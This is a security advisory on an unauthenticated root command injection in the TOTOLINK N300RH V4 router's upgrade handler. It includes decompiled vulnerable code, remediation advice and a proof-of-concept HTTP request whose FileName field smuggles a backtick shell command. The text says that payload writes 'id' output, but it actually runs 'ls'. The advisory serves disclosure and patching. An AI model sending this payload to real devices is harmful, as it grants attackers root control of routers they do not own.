# TOTOLINK N300RH V4: Unauthenticated OS Command Injection (CWE-78) in `upgrade.so` (`setUpgradeUboot` / `FileName`)
 
 ## Summary
 
 The TOTOLINK N300RH V4 web management interface contains an **unauthenticated OS command injection** vulnerability in the `setUpgradeUboot` handler within `upgrade.so`. The handler reads an attacker-controlled `FileName` parameter and passes it into the bootloader upgrade routine, where it is concatenated into shell command strings and executed via `CsteSystem()`.
 
 A remote attacker can exploit this issue **without authentication or user interaction** to execute arbitrary operating system commands as **root**.
 
 ## Impact
 
 - **Remote Code Execution (RCE)** via the web management interface
 - **No authentication required**
 - **Privilege:** root (verified by `uid=0(root) gid=0(root)`)
 
 ## Affected Products
 
 - **Vendor:** TOTOLINK
 - **Product:** TOTOLINK N300RH V4 Wireless Router
 - **Vulnerability type:** OS Command Injection (CWE-78)
 
 ### Tested vulnerable firmware
 
 - V6.1c.1353
 - V6.1c.1390_B20191101
 
 **Firmware download address:**  
 https://www.totolink.net/home/menu/detail/menu_listtpl/download/id/188/ids/36.html
 
 > The vulnerability was verified on firmware version V6.1c.1390_B20191101. The other version listed above is considered likely affected based on the same observed code pattern.
 
 ## Attack Vector
 
 - **Entry point:** `POST /cgi-bin/cstecgi.cgi`
 - **Handler selector:** `topicurl=setUpgradeUboot`
 - **Injection parameter:** `FileName`
 - **Authentication:** not required (unauthenticated)
 - **User interaction:** not required
 
 ## Technical Details
 
 The web management interface retrieves the user-controlled `FileName` parameter via `websGetVar()` and passes it into the bootloader upgrade routine. The root cause is **improper neutralization of externally supplied input before it is embedded into shell command strings**.
 
 The `FileName` value is forwarded to `mtd_write_bootloader()`, where it is inserted directly into command templates and executed through `CsteSystem()`. Because no sanitization or escaping is applied, shell metacharacters in `FileName` can terminate the intended command context and inject arbitrary operating system commands.
 
 The vulnerable logic (decompiled) is:
 
 ```c
 Var = (const char *)websGetVar(a2, "FileName", "");
 v7 = (const char *)websGetVar(a2, "ContentLength", "");
 ...
 if ( !fork(v17) )
 {
   sleep(2);
   mtd_write_bootloader(Var, 0, v16);
   exit(1);
 }
 
 int __fastcall mtd_write_bootloader(const char *a1, int a2, int a3)
 {
   _BYTE v7[512];
 
   if ( a2 > 0 )
   {
     sprintf(v7, "dd if=%s of=/tmp/uboot2.img bs=%d skip=1", a1, a2);
     CsteSystem(v7, 0);
     sprintf(v7, "dd if=/tmp/uboot2.img of=%s bs=%d count=1", a1, a3);
     CsteSystem(v7, 0);
     sprintf(v7, "rm -f /tmp/uboot2.img", a3);
     CsteSystem(v7, 0);
   }
 
   snprintf(v7, 512, "mtd -r write %s %s", a1, "u-boot");
   return CsteSystem(v7, 0);
 }
 ```
 
 ![The `FileName` parameter is retrieved from the request and passed into `mtd_write_bootloader()`.](images/image-20250531100234-x8iguaa.png)
 
 ![The `mtd_write_bootloader()` routine constructs a shell command using attacker-controlled input and executes it through `CsteSystem()`.](images/image-20250531100247-79s2tms.png)
 
 The vulnerability flow is:
 
 1. **Unvalidated external input**  
    `FileName` is obtained directly from the HTTP request via `websGetVar(a2, "FileName", "")` and passed into `mtd_write_bootloader()` without validation or sanitization.
 
 2. **Command string construction**  
    Inside `mtd_write_bootloader()`, attacker-controlled input is embedded into shell command strings such as `dd if=%s ...` and `mtd -r write %s %s`.
 
 3. **Execution with system-level privileges**  
    The constructed command is executed via `CsteSystem(v7, 0)`, resulting in command execution as root.
 
 ## Proof of Concept (PoC)
 
 ### Steps to reproduce
 
 1. Send a crafted request to `/cgi-bin/cstecgi.cgi` with `topicurl` set to `setUpgradeUboot`.
 2. Inject shell metacharacters via the `FileName` parameter.
 3. Verify command execution by retrieving a web-accessible output file.
 
 ### Example request
 
 The following payload writes the output of `id` into a web-accessible file:
 
 ```http
POST /cgi-bin/cstecgi.cgi HTTP/1.1
Host: <host>
Accept-Language: zh-CN,zh;q=0.9
Origin: http://<host>
X-Requested-With: XMLHttpRequest
Accept: */*
Referer: http://<host>/login.asp
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Content-Length: 116

{
  "topicurl": "setUpgradeUboot",
  "ContentLength": "0",
  "FileName": "123`ls > /usr/lib/lighttpd/web/123.txt`"
}
 ```
 
 ### Verification
 
 **Raw HTTP request**:
 
 ![Raw HTTP request containing the injected `FileName` payload.](images/image-20250531101639-w0l9g2b.png)
 
 **Observed result** (retrieved output shows root privileges):
 
 ![HTTP response showing `uid=0(root) gid=0(root)`.](images/image-20250531101645-9onxatx.png)
 
 ## Remediation
 
 - Validate and strictly whitelist `FileName` (e.g., restrict to expected filename patterns and disallow any shell metacharacters).
 - Avoid constructing shell command strings with user input. Prefer direct syscalls/APIs or invoke tools with safe argument passing (no shell).
 - If shell execution is unavoidable, ensure robust escaping and use fixed command paths with sanitized parameters.
 - Add authentication/authorization checks for sensitive upgrade endpoints.
